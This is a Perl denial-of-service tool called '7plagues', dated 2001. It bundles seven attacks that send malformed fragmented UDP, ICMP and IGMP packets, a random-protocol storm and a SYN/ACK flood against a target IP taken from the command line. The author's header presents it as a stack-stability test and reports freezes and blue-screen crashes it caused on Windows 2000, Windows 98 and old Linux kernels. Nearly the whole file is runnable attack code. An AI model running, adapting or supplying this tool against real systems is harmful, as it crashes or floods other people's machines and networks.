#!/usr/bin/perl -w

###############################################################################
#                                                                             #
# 7plagues, by 51 (May 2001)                                                  #
#                                                                             #
# Threaded (or forked when threads not available) 7-headed Denial of Service, #
# which should be used to test/audit the TCP/IP stack stability on your       #
# different Operating Systems, under extreme network conditions.              #
#                                                                             #
# The seven different DoS implemented there (1 over udp, 2 over icmp, 2 over  #
# igmp, 1 over tcp and 1 using random protocol numbers) exploit some known    #
# bugs of various networking proto stacks. Some parts of this code are        #
# inspired from existing C implementations (jolt2, trash2, etc...).           #
#                                                                             #
# I used Perl rather than C for the implementation easeness of  this straight #
# language, but I eventually figured out that I hadn't lost much in speed     #
# and efficiency at run time (not to say I hadn't lost anything, heh).        #
#                                                                             #
# The tests I've been able to perform (an old PII 350 with a 10 Mb ethernet   #
# card flooding a Duron 700 with 256 MB of Ram and a 3Com 10/100 Mb card)     #
# gave the following results :                                                #
# w2k : freezes when unleashing udp or icmp plagues, lags with igmp           #
# w98 : blue screen of death upon igmp                                        #
# linux : old kernels are exhausted under the tcp flood                       #
# I'll appreciate any report in various testing conditions :o)                #
#                                                                             #
# Requirements :                                                              #
# Net::RawIP by Sergey Kolychev - http://quake.skif.net/RawIP/                #
#                                                                             #
# Shouts go to Gluck, full time Perl Guru :)                                  #
# Greetz to the CyberArmy higher ups. Visit us at  www.cyberarmy.com, or on   #
# irc: irc.cyberarmy.com chan #cyberarmy, coolest guys in #void and #unixgods.#
#                                                                             #
# 51 (void *)                                                                 #
# mail: kernel51@libertysurf.fr                                               #
#                                                                             #
# I am not a numero...                                                        #
#                                                                             #
###############################################################################



use strict;
use Config;
use Net::RawIP;

# Array of pointers on the selected plagues
my @plagues;

# Array of the selected protocol names
my @protos;

# Target IP
my $sinner = $ARGV[0];

# Different types of DoS are available...
my $sin = $ARGV[1];

# Number of hits (optional)
my $repant = $ARGV[2];

my $argsnum = @ARGV;

print "\n7plagues.pl by 51\n\n";

if ($argsnum < 2 || $argsnum > 3) {
  &usage();
  exit;
}

if ($argsnum == 2) {
  $repant = -1;
}

$_ = $sin;

# Guru line to retrieve the specified protocols :)
@protos = /(\w+)/g;

# flag to be risen upon a valid protocol
my $flag = 0;
my $i;

for($i = 0; $i < @protos; $i++) {
  if($protos[$i] eq "udp") {
    push(@plagues,\&seaOfBlood);
    $flag = 1;
  }
  if($protos[$i] eq "icmp") {
    push(@plagues,\&riversOfBlood);
    push(@plagues,\&scorchingFire);
    $flag = 1;
  }
  if($protos[$i] eq "igmp") {
    push(@plagues,\&kingdomOfDarkness);
    push(@plagues,\&markOfTheBeast);
    $flag = 1;
  }
  if($protos[$i] eq "tcp") {
    push(@plagues,\&armageddon);
    $flag = 1;
  }
  if($protos[$i] eq "misc") {
    push(@plagues,\&greatVoice);
    $flag = 1;
  }
}

if(!$flag) {
  print "No valid proto specified\n";
  &usage();
  exit;
}

print "Revelation 15:1\n";
print "And I saw another sign in Heaven, great and marvelous, ";
print "seven angels having the seven last plagues; ";
print "for in them is filled up the wrath of God.\n\n";
print "Bringing up Apocalyptical network conditions (ph33r)...\n";

if ($Config{usethreads}) {
  require Threads;
  my $thr;
  for($i = 0; $i < @plagues; $i++) {
    $thr = new Thread $plagues[$i], $sinner, $repant;
  }
}
else {
  &spawnhell(0);
}

sub usage {
  print "Usage: ./7plagues.pl target_ip Proto [hits]\n";
  print "Choose Proto among udp, icmp, igmp, tcp or misc.\n";
  print "More than one can be specified, in which case the DoS will be ";
  print "threaded (and might lose in efficiency on slower systems).\n";
  print "Example: ./7plagues.pl 192.168.0.1 udp,icmp,igmp\n\n";  
}



# Nice piece of code to simulate the use of threads with fork() calls
# Requires an array of pointers on the functions to be threaded (@plagues)

sub spawnhell {
  my $indice = $_[0];
  my $pid;
  
  if($pid = fork) {
    &{$plagues[$indice]}($sinner, $repant);
    waitpid($pid,0);
  }
  else {
    die "cannot fork: $!" unless defined $pid; 
    if($indice < @plagues - 1) {
      &spawnhell($indice+1);
    }
    exit;
  }
}



# icmp fragmentation bug

sub riversOfBlood {
  my($packet, $target_address, $hits, $i);
  $target_address = $_[0];
  $hits = $_[1];
  $packet = new Net::RawIP({
			    ip   => {
				     saddr => $target_address,
				     daddr => $target_address,
				     id => 0x455,
				     ttl => 255,
				     tos => 0,
				     frag_off => 8190
				    },
			    icmp => {
				     code => 0,
				     type => 8,
				     check => 0,
				     data => chr(0)
				    }
			   });

  for($i=0; $i != $hits; $i++) {
    $packet->send;	 
  }
  print "\n";
}



# udp fragmentation bug. Very effective on w2k boxes.

sub seaOfBlood {
  my($packet, $target_address, $port, $hits, $i);
  $target_address = $_[0];
  $port = 179;
  $hits = $_[1];
  $packet = new Net::RawIP({
			    ip   => {
				     daddr => $target_address,
				     id => 0x455,
				     ttl => 255,
				     tos => 0,
				     frag_off => 8190
				    },
			    udp  => {
				     source => 1235,
				     dest => $port,
				     len => 9,
				     data => chr(0)
				    }
			   });

  for($i=0; $i != $hits; $i++) {
    $packet->send;	 
  }
  print "\n";
}



# igmp bug causing bsod under w98

sub markOfTheBeast {
  my($packet, $data, $target_address, $hits, $i, $j);
  $target_address = $_[0];
  $hits = $_[1];
  $data = chr(0) x 1480;
  $packet = new Net::RawIP({
			    ip => {
				   daddr => $target_address,
				   ttl => 255,
				   id =>  int(rand(40000)) + 500,
				   frag_off => 0x2000,
				   protocol => 2,
				   tos => 0
				  },
			    generic => {
					data => $data
				       }
			   });

  for($i=0; $i != $hits; $i++) {
    $packet->send;
    for($j=1;$j<5;$j++) {
      if($j>3) {$packet->set({ip => {frag_off => (1480 * $j  >> 3)}});}
      else {$packet->set({ip => {frag_off => (1480 * $j >> 3)|0x2000}});}
      $packet->send;
    }
    $packet->set({ip => {frag_off => 0x2000}});	 
  }
  print "\n";
}



# Buggy icmp sequence causing w2k machines to lag awfuly (brrr)

sub scorchingFire {
  my($packet, $target_address, $hits, $i, $frag);
  $target_address = $_[0];
  $hits = $_[1];
  $packet = new Net::RawIP({
			    ip => {
				   daddr => $target_address,
				   ttl => 30,
				   id =>  1234,
				   frag_off => 0x2000,
				   tos => 0
				  },
			    icmp => {
				     type => int(rand(15)),
				     code => int(rand(15)),
				     data => '0'
				    }
			   });

  for($i=0; $i != $hits; $i++) {
    $packet->send;
    $frag = 8 >> 3;
    $frag |= 0x2000;
    $packet->set({
		  ip => {
			 frag_off => $frag
			},
		  icmp => {
			   type => int(rand(15)),
			   code => int(rand(15)),
			   check => 0,
			   data => '0' x 8
			  }
		 });
    $packet->send;	 
  }
  print "\n";
}



# Various buggy igmp packets sequence

sub kingdomOfDarkness {
  my($packet, $data, $target_address, $hits, $i, $frag);
  $target_address = $_[0];
  $hits = $_[1];
  $data = chr(8);
  $data .= chr(0);
  $data .= chr(0) x 6;
  $data .= chr(0);
  $packet = new Net::RawIP({
			    ip => {
				   daddr => $target_address,
				   ttl => 255,
				   id =>  34717,
				   frag_off => 0x2000,
				   protocol => 2,
				   tos => 0
				  },
			    generic => {
					data => $data
				       }
			   });

  for($i=0; $i != $hits; $i++) {
    $packet->send;
    $frag = 8 >> 3;
    $frag |= 0x2000;
    $packet->set({
		  ip => {
			 frag_off => $frag
			}
		 });	
    $packet->send;
    $data = chr(0) x 16;
    $packet->set({
		  generic => {
			      data => $data
			     }
		 });
    $packet->send;
    $frag = 0x2000;
    $data = chr(2);
    $data .= chr(int(rand(255)));
    $data .= chr(0) x 7;
    $packet->set({
		  ip => {
			 frag_off => $frag
			},
		  generic => {
			      data => $data
			     }
		 });
    $packet->send;
    $frag = 8 >> 3;
    $frag |= 0x2000;
    $packet->set({
		  ip => {
			 frag_off => $frag
			}
		 });
    $packet->send;
    $frag = 0x2000;
    $data = chr(int(rand(255)));
    $data .= chr(int(rand(255)));
    $data .= chr(0) x 7;
    $packet->set({
		  ip => {
			 frag_off => $frag
			},
		  generic => {
			      data => $data
			     }
		 });
    $packet->send;
    $frag = 8 >> 3;
    $frag |= 0x2000;
    $packet->set({
		  ip => {
			 frag_off => $frag
			}
		 });
    $packet->send;
    $frag = 0x2000;
    $data = chr(8);
    $data .= chr(0) x 8;
    $packet->set({
		  ip => {
			 frag_off => $frag
			},
		  generic => {
			      data => $data
			     }
		 });
  }
  print "\n";
}



# Storm of random protocol packets with specific frag offsets and flags
# targa3 style...

sub greatVoice {
  my($packet, $target_address, $hits, $i);
  my(@protos, @frags, $proto, $frag);
  $target_address = $_[0];
  $hits = $_[1];
  @protos = (0,1,2,4,6,8,12,17,22,41,58,255,0);
  @frags = (0,0,0,0x2000,8192,0x4,0x6,16383,1,8190);
  $packet = new Net::RawIP({
			    ip   => {
				     daddr => $target_address,
				     ttl => 255,
				     tos => 0
				    }
			   });

  for($i=0; $i != $hits; $i++) {
    $proto = $protos[int(rand(@protos))];
    $frag = $frags[int(rand(@frags))];
    $packet->set({
		  ip => {
			 protocol => $proto,
			 frag_off => $frag
			}
		 });
    $packet->send; 
  }
  print "\n";
}



# 1024 SYN for 1 ACK... supposed to hang some older Linux kernels

sub armageddon {
  my($packet, $target_address, $port, $hits, $i);
  $target_address = $_[0];
  $port = 139;
  $hits = $_[1];
  $hits *= 1024;
  $packet = new Net::RawIP({
			    ip   => {
				     daddr => $target_address,
				     ttl => 255,
				     tos => 0x08 ,
				     frag_off => 0,
				     id => int(rand(65536))
				    },
			    tcp  => {
				     window => 16384,
				     ack => 0,
				     doff => 5,
				     urg => 0,
				     dest => $port,
				     data => chr(0)
				    }
			   });
  for($i=0; $i != $hits; ++$i) {
    if( !($i&0x3FF) ) {
      $packet->set({
		    tcp  => {
			     ack => 0,
			     syn => 1,
			     ack_seq => 0
			    }
		   });
    }
    else {
      $packet->set({
		    tcp  => {
			     syn => 0,
			     ack => 1,
			     ack_seq => int(rand(65536))
			    }
		   });
    }
    $packet->send;
  }
  print "\n";
}
